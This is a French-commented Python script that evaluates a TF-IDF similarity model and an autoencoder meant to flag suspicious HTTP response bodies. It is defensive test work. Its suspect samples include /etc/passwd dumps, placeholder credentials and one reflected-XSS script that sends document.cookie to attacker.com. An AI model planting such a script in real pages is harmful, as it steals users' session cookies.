#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Sun Mar 22 22:18:06 2026

@author: hounsousamuel
"""

#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║   ShieldAI — evaluate_models.py                                             ║
║   Évaluation complète de CosineSimilarityTFIDF + AutoencoderA              ║
╠══════════════════════════════════════════════════════════════════════════════╣
║  Ce script évalue :                                                         ║
║  1. CosineSimilarityTFIDF — capacité à distinguer normal vs suspect        ║
║  2. AutoencoderA — erreur de reconstruction normal vs suspect              ║
║  3. Combiné — score fusionné cosine + autoencoder                          ║
║  4. Diagnostic — pourquoi ça marche ou pas                                 ║
║                                                                             ║
║  Usage :                                                                    ║
║    python evaluate_models.py                                                ║
╚══════════════════════════════════════════════════════════════════════════════╝
Author : Samuel — ShieldAI
"""

import os, sys
sys.path.insert(1, os.path.dirname(os.path.abspath(os.path.join(__file__, ".."))))

import pickle
import numpy as np
import torch
from loguru import logger

# ── Logs ──────────────────────────────────────────────────────────────────────
logger.remove()
logger.add(
    sys.stdout,
    format=(
        "<yellow>{time:HH:mm:ss}</yellow> | "
        "<level>{level: <8}</level> | "
        "<cyan>{function}</cyan>:<cyan>{line}</cyan>\n"
        "└─ <level>{message}</level>"
    ),
    level="INFO", colorize=True
)

# ── Paths ─────────────────────────────────────────────────────────────────────
BASE_DIR      = os.path.dirname(os.path.abspath(__file__))
BODIES_PATH   = os.path.join(BASE_DIR, "bodies", "bodies_deduplicate.pkl")
COSINE_DIR    = "/home/hounsousamuel/PROJET/ShieldIA_v2/scanner_ia/fuzzer/model_similarity"
AE_MODEL_PATH = "/home/hounsousamuel/PROJET/ShieldIA_v2/scanner_ia/autoencoders/model_autoencoder_bodies/model.pt"
N_FEATURES    = 5000

# ══════════════════════════════════════════════════════════════════════════════
# DONNÉES DE TEST
# ══════════════════════════════════════════════════════════════════════════════

# Bodies normaux — réponses HTTP typiques de sites sains
NORMAL_BODIES = [
    # HTML e-commerce
    """<!DOCTYPE html><html><head><title>Boutique en ligne</title></head>
<body><h1>Bienvenue</h1><p>Découvrez nos produits.</p>
<ul><li>Produit A - €29.99</li><li>Produit B - €49.99</li></ul>
<form method="post"><input name="email" type="email"><button>S'inscrire</button></form>
</body></html>""",

    # JSON API e-commerce
    '{"status":"success","data":{"id":1,"name":"Laptop Pro","price":999.99,"category":"electronics","stock":42,"rating":4.5},"meta":{"total":150,"page":1}}',

    # HTML blog
    """<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Mon Blog Tech</title></head>
<body><article><h1>Introduction à Python</h1>
<p>Python est un langage de programmation populaire utilisé dans de nombreux domaines.</p>
<p>Dans cet article, nous allons explorer les bases du langage.</p>
</article></body></html>""",

    # JSON API utilisateurs
    '{"users":[{"id":1,"username":"alice","email":"alice@example.com","role":"user","active":true},{"id":2,"username":"bob","email":"bob@example.com","role":"admin","active":true}],"total":2}',

    # XML RSS feed
    """<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0"><channel>
<title>Blog Tech</title><link>https://example.com</link>
<item><title>Article 1</title><description>Description de l'article 1</description></item>
<item><title>Article 2</title><description>Description de l'article 2</description></item>
</channel></rss>""",

    # HTML formulaire de connexion
    """<!DOCTYPE html><html><head><title>Connexion</title></head>
<body><form method="post" action="/login">
<label>Email: <input type="email" name="email" required></label>
<label>Mot de passe: <input type="password" name="password" required></label>
<button type="submit">Se connecter</button>
</form><p><a href="/register">Créer un compte</a></p></body></html>""",

    # JSON API produits
    '{"products":[{"id":1,"title":"Phone X","price":599,"brand":"TechBrand","category":"smartphones","description":"Latest smartphone with advanced features"},{"id":2,"title":"Tablet Y","price":399,"brand":"TabBrand","category":"tablets","description":"Lightweight tablet for everyday use"}]}',

    # Page d'erreur 404 normale
    """<!DOCTYPE html><html><head><title>404 - Page non trouvée</title></head>
<body><h1>Page non trouvée</h1>
<p>La page que vous cherchez n'existe pas.</p>
<a href="/">Retour à l'accueil</a></body></html>""",

    # JSON API réponse simple
    '{"status":"ok","version":"1.0.0","uptime":12345,"services":{"database":"healthy","cache":"healthy","storage":"healthy"}}',

    # Requête HTTP normale style CSIC
    """GET /tienda1/publico/entrar.jsp HTTP/1.1
Host: localhost:8080
User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux)
Accept: text/html,application/xhtml+xml
Cookie: JSESSIONID=ABC123DEF456
Connection: close""",
]

# Bodies suspects — contenu anormal que l'autoencoder doit détecter
SUSPECT_BODIES = [
    # ── CMDi / RCE ───────────────────────────────────────────────────────────
    (
        "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nwww-data:x:33:33:",
        "CMDi — /etc/passwd dans réponse"
    ),
    (
        "uid=0(root) gid=0(root) groups=0(root)\nSHLDABCD1234-uid=0(root)-myserver",
        "CMDi — output id/whoami"
    ),

    # ── SQLi ─────────────────────────────────────────────────────────────────
    (
        "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version near 'SELECT * FROM users WHERE id=' at line 1\nSQLSTATE[42000]: Syntax error",
        "SQLi — erreur MySQL"
    ),
    (
        "Warning: mysql_fetch_array() expects parameter 1 to be resource\nSQLite3::query(): Unable to prepare statement",
        "SQLi — erreur PHP/SQLite"
    ),

    # ── DirTrav ───────────────────────────────────────────────────────────────
    (
        "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:\nbin:x:2:2:\nnobody:x:65534:65534:\nwww-data:x:33:33:",
        "DirTrav — /etc/passwd complet"
    ),
    (
        "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAA\nAAAAAAAAAAAAAAAAAAAA\n-----END OPENSSH PRIVATE KEY-----",
        "DirTrav — clé SSH privée"
    ),

    # ── Credentials exposés ───────────────────────────────────────────────────
    (
        "DB_PASSWORD=Sup3rS3cr3tP@ssw0rd!\nAPI_KEY=sk-shieldai-1234567890abcdef\nAWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
        "CredsExpose — .env exposé"
    ),
    (
        "[default]\naws_access_key_id = AKIAIOSFODNN7EXAMPLE\naws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\nregion = us-east-1",
        "CredsExpose — AWS credentials"
    ),

    # ── SSTI ─────────────────────────────────────────────────────────────────
    (
        "1787569\njinja2.exceptions.TemplateSyntaxError: unexpected '}'",
        "SSTI — résultat calcul + erreur Jinja2"
    ),

    # ── XSS reflété ───────────────────────────────────────────────────────────
    (
        "<html><body><script>fetch('https://attacker.com/steal?c='+document.cookie)</script><p>Résultats pour: </p></body></html>",
        "XSS — script malveillant reflété"
    ),

    # ── SSRF — metadata AWS ───────────────────────────────────────────────────
    (
        "ami-id: ami-0123456789abcdef0\ninstance-id: i-0123456789abcdef0\nlocal-ipv4: 10.0.0.42\niam/security-credentials/role\n169.254.169.254\nSSRF successful",
        "SSRF — metadata AWS"
    ),

    # ── XXE ───────────────────────────────────────────────────────────────────
    (
        "lxml.etree.XMLSyntaxError: entity resolution succeeded\nroot:x:0:0:root:/root:/bin/bash",
        "XXE — entity resolution"
    ),

    # ── NoSQLi ───────────────────────────────────────────────────────────────
    (
        '{"error":"MongoServerError: unknown operator: $ne","CastError":"Cast to ObjectId failed","$where is not allowed":true}',
        "NoSQLi — erreur MongoDB"
    ),
]

# ══════════════════════════════════════════════════════════════════════════════
# HELPERS
# ══════════════════════════════════════════════════════════════════════════════

def load_cosine_model():
    """Charge CosineSimilarityTFIDF."""
    try:
        from fuzzer.similarity import CosineSimilarityTFIDF
        model = CosineSimilarityTFIDF(model_dir=COSINE_DIR, n_features=N_FEATURES)
        model.load_model(COSINE_DIR)
        return model
    except Exception as e:
        logger.error(f"Impossible de charger CosineSimilarityTFIDF : {e}")
        return None


def load_ae_model():
    """Charge AutoencoderA."""
    try:
        from autoencoders.autoencoder_x_torch import AutoencoderX
        ae = AutoencoderX()
        ae.load_model(AE_MODEL_PATH)
        ae.eval()
        return ae
    except Exception as e:
        logger.error(f"Impossible de charger AutoencoderA : {e}")
        return None


def transform_body(cosine_model, body: str) -> torch.Tensor:
    """
    Transforme un body en tenseur TF-IDF.
    Gère les deux cas : sparse matrix (.toarray()) ou dense numpy array.
    """
    vec = cosine_model.transform([body])
    # Si sparse matrix (sklearn) → convertir en dense
    if hasattr(vec, 'toarray'):
        vec = vec.toarray()
    # vec est maintenant un numpy array shape (1, n_features)
    return torch.from_numpy(vec.astype(np.float32))


def get_cosine_distance(cosine_model, body_a: str, body_b: str) -> float:
    """Calcule la distance cosine entre deux bodies (0=identiques, 100=opposés)."""
    sim = cosine_model.cosine_similarity(body_a, body_b, aggregation='min')
    return float((1 - sim) * 100)


def get_ae_error(ae_model, cosine_model, body: str) -> float:
    """Calcule l'erreur de reconstruction de l'autoencoder pour un body."""
    t = transform_body(cosine_model, body)
    with torch.inference_mode():
        err = ae_model.reconstruction_error(t)
    return float(err.item())


# ══════════════════════════════════════════════════════════════════════════════
# ÉVALUATION 1 — CosineSimilarityTFIDF
# ══════════════════════════════════════════════════════════════════════════════
def evaluate_cosine(cosine_model, normal_ref: str):
    """
    Évalue la cosine similarity en comparant un body normal de référence
    contre tous les bodies normaux et suspects.
    """
    print("\n" + "═" * 70)
    print("  📐 ÉVALUATION 1 — CosineSimilarityTFIDF")
    print("  Référence : premier body normal")
    print("═" * 70)

    print("\n  Bodies NORMAUX (distance doit être BASSE ≤ 30) :")
    normal_distances = []
    for i, body in enumerate(NORMAL_BODIES):
        dist = get_cosine_distance(cosine_model, normal_ref, body)
        normal_distances.append(dist)
        flag = "✅" if dist <= 30 else "⚠️ " if dist <= 60 else "❌"
        print(f"  {flag} dist={dist:5.1f}/100  ← Normal[{i}] : {body[:60].strip()!r}")

    print(f"\n  → Moyenne normale : {np.mean(normal_distances):.1f} | "
          f"Max : {np.max(normal_distances):.1f} | Min : {np.min(normal_distances):.1f}")

    print("\n  Bodies SUSPECTS (distance doit être HAUTE ≥ 40) :")
    suspect_distances = []
    for body, label in SUSPECT_BODIES:
        dist = get_cosine_distance(cosine_model, normal_ref, body)
        suspect_distances.append(dist)
        flag = "✅" if dist >= 40 else "⚠️ " if dist >= 20 else "❌"
        print(f"  {flag} dist={dist:5.1f}/100  ← {label}")

    print(f"\n  → Moyenne suspect : {np.mean(suspect_distances):.1f} | "
          f"Max : {np.max(suspect_distances):.1f} | Min : {np.min(suspect_distances):.1f}")

    # Séparabilité
    sep = np.mean(suspect_distances) - np.mean(normal_distances)
    print(f"\n  📊 Séparabilité (moy_suspect - moy_normal) = {sep:.1f}")
    if sep >= 30:
        print("  ✅ Excellent — le modèle distingue bien normal vs suspect")
    elif sep >= 15:
        print("  ⚠️  Acceptable — séparation partielle")
    else:
        print("  ❌ Insuffisant — le modèle ne distingue pas bien")
        print("     → Cause probable : données d'entraînement trop variées")
        print("       (requêtes CSIC contiennent des tokens similaires aux attaques)")

    return np.mean(normal_distances), np.mean(suspect_distances)


# ══════════════════════════════════════════════════════════════════════════════
# ÉVALUATION 2 — AutoencoderA
# ══════════════════════════════════════════════════════════════════════════════
def evaluate_autoencoder(ae_model, cosine_model):
    """
    Évalue l'autoencoder sur les bodies normaux vs suspects.
    Le ratio erreur_suspect / erreur_normale doit être > 2.
    """
    print("\n" + "═" * 70)
    print("  🤖 ÉVALUATION 2 — AutoencoderA (erreur de reconstruction)")
    print("  Attendu : erreur normale BASSE, erreur suspecte HAUTE")
    print("═" * 70)

    # Erreurs sur bodies normaux
    print("\n  Bodies NORMAUX (erreur doit être BASSE) :")
    normal_errors = []
    for i, body in enumerate(NORMAL_BODIES):
        err = get_ae_error(ae_model, cosine_model, body)
        normal_errors.append(err)
        print(f"  err={err:.6f}  ← Normal[{i}] : {body[:60].strip()!r}")

    mean_normal = np.mean(normal_errors)
    print(f"\n  → Moyenne normale : {mean_normal:.6f} | "
          f"Max : {np.max(normal_errors):.6f} | Std : {np.std(normal_errors):.6f}")

    # Erreurs sur bodies suspects
    print("\n  Bodies SUSPECTS (erreur doit être HAUTE, ratio > 2x) :")
    suspect_errors = []
    for body, label in SUSPECT_BODIES:
        err = get_ae_error(ae_model, cosine_model, body)
        suspect_errors.append(err)
        ratio = err / max(mean_normal, 1e-8)
        flag  = "✅" if ratio > 2.0 else "⚠️ " if ratio > 1.2 else "❌"
        print(f"  {flag} err={err:.6f} (x{ratio:.1f})  ← {label}")

    mean_suspect = np.mean(suspect_errors)
    ratio_global = mean_suspect / max(mean_normal, 1e-8)

    print(f"\n  → Moyenne suspect : {mean_suspect:.6f} | Ratio global : x{ratio_global:.1f}")

    if ratio_global >= 2.0:
        print("  ✅ Excellent — l'autoencoder détecte bien les anomalies")
    elif ratio_global >= 1.3:
        print("  ⚠️  Partiel — détection faible")
    else:
        print("  ❌ Insuffisant — l'autoencoder ne détecte pas les anomalies")
        print()
        print("  🔍 DIAGNOSTIC :")
        print("  Le problème vient probablement de l'entraînement sur CSIC 2010.")
        print("  Le CSIC contient des REQUÊTES HTTP (pas des réponses).")
        print("  Ces requêtes contiennent des patterns comme :")
        print("    - URLs avec paramètres SQL-like : ?id=1&nombre=Vino")
        print("    - Headers normaux : User-Agent, Cookie, Accept")
        print("  Ces patterns se retrouvent aussi dans les payloads d'attaque.")
        print("  Résultat : l'autoencoder considère les attaques comme 'normales'.")
        print()
        print("  ✅ SOLUTION :")
        print("  Entraîner l'autoencoder UNIQUEMENT sur des body de RÉPONSES :")
        print("    - Crawl HTML (localhost:7000, Wikipedia, books.toscrape.com)")
        print("    - Fetch APIs JSON/XML (jsonplaceholder, dummyjson, etc.)")
        print("  → Exclure le CSIC de l'entraînement de l'autoencoder")
        print("  → Garder le CSIC uniquement pour le CosineSimilarityTFIDF")

    return mean_normal, mean_suspect


# ══════════════════════════════════════════════════════════════════════════════
# ÉVALUATION 3 — Score combiné cosine + autoencoder
# ══════════════════════════════════════════════════════════════════════════════
def evaluate_combined(cosine_model, ae_model, normal_ref: str):
    """
    Score combiné : (cosine_distance + ae_error_normalized) / 2
    Plus ce score est élevé, plus le body est suspect.
    """
    print("\n" + "═" * 70)
    print("  🔀 ÉVALUATION 3 — Score combiné (cosine + autoencoder)")
    print("═" * 70)

    # Calculer les erreurs normales pour normaliser
    ae_normal_errors = [get_ae_error(ae_model, cosine_model, b) for b in NORMAL_BODIES]
    ae_max_normal    = max(ae_normal_errors) if ae_normal_errors else 1.0

    def combined_score(body: str, ref: str) -> tuple[float, float, float]:
        dist = get_cosine_distance(cosine_model, ref, body)
        err  = get_ae_error(ae_model, cosine_model, body)
        # Normaliser l'erreur AE entre 0 et 100 (par rapport au max normal)
        err_norm = min(100.0, (err / max(ae_max_normal, 1e-8)) * 50)
        score    = (dist + err_norm) / 2
        return score, dist, err_norm

    print("\n  Bodies NORMAUX (score doit être BAS ≤ 30) :")
    normal_scores = []
    for i, body in enumerate(NORMAL_BODIES):
        score, dist, err_n = combined_score(body, normal_ref)
        normal_scores.append(score)
        flag = "✅" if score <= 30 else "⚠️ " if score <= 50 else "❌"
        print(f"  {flag} score={score:5.1f} (cosine={dist:.1f}, ae={err_n:.1f})  "
              f"← Normal[{i}]")

    print(f"\n  → Score moyen normal : {np.mean(normal_scores):.1f}")

    print("\n  Bodies SUSPECTS (score doit être HAUT ≥ 50) :")
    suspect_scores = []
    for body, label in SUSPECT_BODIES:
        score, dist, err_n = combined_score(body, normal_ref)
        suspect_scores.append(score)
        flag = "✅" if score >= 50 else "⚠️ " if score >= 30 else "❌"
        print(f"  {flag} score={score:5.1f} (cosine={dist:.1f}, ae={err_n:.1f})  "
              f"← {label}")

    sep = np.mean(suspect_scores) - np.mean(normal_scores)
    print(f"\n  → Score moyen suspect : {np.mean(suspect_scores):.1f}")
    print(f"  → Séparabilité combinée : {sep:.1f}")

    if sep >= 20:
        print("  ✅ Score combiné efficace")
    else:
        print("  ⚠️  Score combiné insuffisant — améliorer les données d'entraînement")


# ══════════════════════════════════════════════════════════════════════════════
# ÉVALUATION 4 — Analyse des vecteurs TF-IDF (diagnostic)
# ══════════════════════════════════════════════════════════════════════════════
def evaluate_tfidf_vectors(cosine_model):
    """
    Analyse les vecteurs TF-IDF pour comprendre si le modèle
    représente bien les différences normal/suspect.
    """
    print("\n" + "═" * 70)
    print("  🔬 ÉVALUATION 4 — Diagnostic vecteurs TF-IDF")
    print("═" * 70)

    # Transformer quelques bodies
    bodies_to_check = [
        ("Normal HTML",    NORMAL_BODIES[0]),
        ("Normal JSON",    NORMAL_BODIES[1]),
        ("Normal XML",     NORMAL_BODIES[4]),
        ("Suspect CMDi",   SUSPECT_BODIES[0][0]),
        ("Suspect SQLi",   SUSPECT_BODIES[2][0]),
        ("Suspect Creds",  SUSPECT_BODIES[6][0]),
    ]

    print("\n  Statistiques des vecteurs TF-IDF :")
    print(f"  {'Label':<20} {'Non-zéro':>10} {'Max val':>10} {'Norm L2':>10} {'Sparsité':>10}")
    print("  " + "-" * 65)

    for label, body in bodies_to_check:
        vec = cosine_model.model.transform([body])
        if hasattr(vec, 'toarray'):
            arr = vec.toarray()[0]
        else:
            arr = vec[0] if vec.ndim > 1 else vec

        nonzero   = np.count_nonzero(arr)
        max_val   = arr.max()
        norm_l2   = np.linalg.norm(arr)
        sparsity  = 1.0 - nonzero / len(arr)

        print(f"  {label:<20} {nonzero:>10} {max_val:>10.4f} {norm_l2:>10.4f} {sparsity:>9.1%}")

    print()
    print("  💡 Interprétation :")
    print("  - Si les vecteurs suspects ont peu de features non-nulles → tokens inconnus")
    print("    → Ces tokens ne sont pas dans le vocabulaire TF-IDF")
    print("    → Le modèle les traite comme des vecteurs quasi-vides → proches de tout")
    print("  - Solution : entraîner sur des données qui incluent ces patterns")
    print("    (ou utiliser un vocabulaire plus large avec n_features plus grand)")


# ══════════════════════════════════════════════════════════════════════════════
# ÉVALUATION 5 — Test avec les bodies réels du dataset
# ══════════════════════════════════════════════════════════════════════════════
def evaluate_on_real_data(cosine_model, ae_model):
    """
    Évalue sur un échantillon des vraies données d'entraînement
    pour vérifier que le modèle reconstruit bien ce qu'il a vu.
    """
    print("\n" + "═" * 70)
    print("  📦 ÉVALUATION 5 — Vérification sur données réelles")
    print("═" * 70)

    if not os.path.exists(BODIES_PATH):
        print(f"  ⚠️  Fichier bodies non trouvé : {BODIES_PATH}")
        return

    with open(BODIES_PATH, 'rb') as f:
        bodies = pickle.load(f)

    # Prendre un échantillon aléatoire
    import random
    random.seed(42)
    sample = random.sample(bodies, min(20, len(bodies)))

    print(f"\n  Dataset : {len(bodies)} bodies total")
    print(f"  Échantillon : {len(sample)} bodies\n")

    errors = []
    for body in sample:
        err = get_ae_error(ae_model, cosine_model, body)
        errors.append(err)

    errors = np.array(errors)
    print(f"  Erreur de reconstruction sur données d'entraînement :")
    print(f"    Moyenne : {errors.mean():.6f}")
    print(f"    Std     : {errors.std():.6f}")
    print(f"    Min     : {errors.min():.6f}")
    print(f"    Max     : {errors.max():.6f}")
    print(f"    P95     : {np.percentile(errors, 95):.6f}")

    # Seuil suggéré
    threshold = errors.mean() + 2 * errors.std()
    print(f"\n  💡 Seuil suggéré (moy + 2*std) : {threshold:.6f}")
    print(f"     → Un body avec erreur > {threshold:.6f} sera considéré anormal")
    print()

    # Tester ce seuil sur les suspects
    print(f"  Test du seuil sur les bodies suspects :")
    detected = 0
    for body, label in SUSPECT_BODIES:
        err = get_ae_error(ae_model, cosine_model, body)
        detected_flag = err > threshold
        flag = "✅ DÉTECTÉ" if detected_flag else "❌ non détecté"
        if detected_flag:
            detected += 1
        print(f"  {flag} err={err:.6f} (seuil={threshold:.6f}) ← {label}")

    print(f"\n  Taux de détection : {detected}/{len(SUSPECT_BODIES)} "
          f"({100*detected/len(SUSPECT_BODIES):.0f}%)")


# ══════════════════════════════════════════════════════════════════════════════
# MAIN
# ══════════════════════════════════════════════════════════════════════════════
def main():
    print("""
╔══════════════════════════════════════════════════════════════════════════════╗
║   ShieldAI — Évaluation CosineSimilarityTFIDF + AutoencoderA               ║
╚══════════════════════════════════════════════════════════════════════════════╝
""")

    # Charger les modèles
    logger.info("Chargement des modèles...")
    cosine_model = load_cosine_model()
    ae_model     = load_ae_model()

    if not cosine_model:
        logger.error("CosineSimilarityTFIDF non disponible. Arrêt.")
        return
    if not ae_model:
        logger.error("AutoencoderA non disponible. Arrêt.")
        return

    logger.success("Modèles chargés")

    # Référence normale
    normal_ref = NORMAL_BODIES[0]

    # Lancer les évaluations
    evaluate_tfidf_vectors(cosine_model)
    evaluate_cosine(cosine_model, normal_ref)
    evaluate_autoencoder(ae_model, cosine_model)
    evaluate_combined(cosine_model, ae_model, normal_ref)
    evaluate_on_real_data(cosine_model, ae_model)

    print("\n" + "═" * 70)
    print("  ✅ Évaluation terminée")
    print("═" * 70)
    print("""
  📋 RÉSUMÉ DES ACTIONS SUGGÉRÉES :
  ─────────────────────────────────
  Si séparabilité cosine < 15 :
    → Le TF-IDF ne distingue pas les attaques — tokens inconnus
    → Augmenter n_features (ex: 10000) ou changer le corpus

  Si ratio AE < 1.3 :
    → L'autoencoder a appris que les attaques sont 'normales'
    → Exclure le CSIC 2010 de l'entraînement de l'autoencoder
    → Entraîner uniquement sur crawl HTML + APIs JSON/XML

  Si les deux marchent mal :
    → Lancer collect_bodies.py --force (sans CSIC pour l'AE)
    → Puis python train_models.py
""")


if __name__ == "__main__":
    main()